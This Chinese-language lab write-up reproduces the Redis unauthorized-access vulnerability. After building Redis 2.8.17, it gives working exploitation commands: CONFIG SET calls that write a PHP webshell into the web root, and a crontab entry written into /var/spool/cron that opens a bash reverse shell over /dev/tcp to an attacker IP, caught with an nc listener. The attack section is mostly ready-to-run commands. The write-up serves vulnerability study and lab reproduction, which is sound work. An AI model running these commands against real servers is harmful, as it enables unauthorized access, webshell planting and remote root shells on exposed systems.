# 漏洞复现 | Redis未授权访问

> 原文：[http://mp.weixin.qq.com/s?\_\_biz=Mzg3MTY3NzUwMQ==&mid=2247483905&idx=1&sn=844ecae227102a61d6c19c8b22951853&chksm=cefba953f98c20456ff27aba7f9f5ca14aa94616a10dd325aa63ed384e4568c466b129636b88&scene=126&sessionid=1681655051#rd](http://mp.weixin.qq.com/s?__biz=Mzg3MTY3NzUwMQ==&mid=2247483905&idx=1&sn=844ecae227102a61d6c19c8b22951853&chksm=cefba953f98c20456ff27aba7f9f5ca14aa94616a10dd325aa63ed384e4568c466b129636b88&scene=126&sessionid=1681655051#rd)

#### 漏洞简介

Redis 默认情况下，会绑定在 0.0.0.0:6379，如果没有进行采用相关的策略，比如添加防火墙规则避免其他非信任来源 ip  访问等，这样将**会将 Redis  服务暴露到公网**上，如果在没有设置密码认证（**一般为空**）的情况下，会导致任意用户在可以访问目标服务器的情况下未授权访问 Redis 以及读取  Redis 的数据。

攻击者在未授权访问 Redis 的情况下，利用 Redis 自身的提供的config  命令，可以登录目标服务器、添加计划任务、写入Webshell等操作。

#### 环境搭建

输入命令如下：

```
wget http://download.redis.io/releases/redis-2.8.17.tar.gz
```

![](../Images/e71a904714775f0680daee1e1646bf20.png)

```
tar xzvf redis-2.8.17.tar.gz  #解压安装包
cd redis-2.8.17  # 进入redis目录
make #编译
```

![](../Images/b2c0e282720a7dc85eacfcfa7d4f4662.png)

```
cd src/ #进入src目录 
cp redis-server /usr/bin/ 
cp redis-cli /usr/bin/      #将redis-server和redis-cli拷贝到/usr/bin目录下（这样启动redis-server和redis-cli就不用每次都进入安装目录了）
cd ..   # 返回上一级目录
cp redis.conf /etc/     #将redis.conf拷贝到/etc/目录下
redis-server /etc/redis.conf  # 使用/etc/目录下的redis.conf文件中的配置启动redis服务
```

![](../Images/ca5fccd37d2f1e69ad44ea3db5cd3f6d.png)

服务启动成功！

#### 利用redis写Webshell

如果已经走到上面那一步了，如果服务器还开了web服务，你又巧合的拿到了它网站的绝对路径，那么你可以尝试写入webshell了。由于这里是本地搭建，所以绝对路径是知道的，为/var/www/html，现实环境中需要自己去想办法。

现在开始，调用出Console,并敲入如下命令：

```
config set dir /var/www/html
config set dbfilename test123.php
set webshell "<?php phpinfo(); ?>"
save
```

![](../Images/66dcb24f8e121b57de930c6859a24118.png)

一条一条输入，这里就不依次截图了。

最后去服务器查看，成功写入，如下图：

![](../Images/4f2233d4272ab0ba9a492c5dd1284ee4.png)

#### 利用crontab反弹shell

```
工具下载：https://github.com/dmajkic/redis/downloads
```

下载好之后，尝试连接Redis，命令如下：

```
 .\\redis-cli.exe -h 192.168.56.133
```

![](../Images/8013f8cc643fd01b0a40b34a9f6ae971.png)

攻击机监听任意一个端口：

```
nc -lvnp 5678
```

如下：

![](../Images/32fa60550b9fc06c41a6be8471017bee.png)

前面已经连接了Redis，接下来写入反弹shell，命令如下：

```
config set dir /var/spool/cron
set -.- "\\n\\n\\n\* \* \* \* \* bash -i >& /dev/tcp/192.168.137.50/5678 0>&1\\n\\n\\n"
config set dbfilename root
save
```

![](../Images/5100dbd86c7d9f66d750eafd81e86beb.png)

这时候查看本地监听的端口，发现反弹成功！

![](../Images/40a6b62c33ef178bd7a133774f0743f7.png)
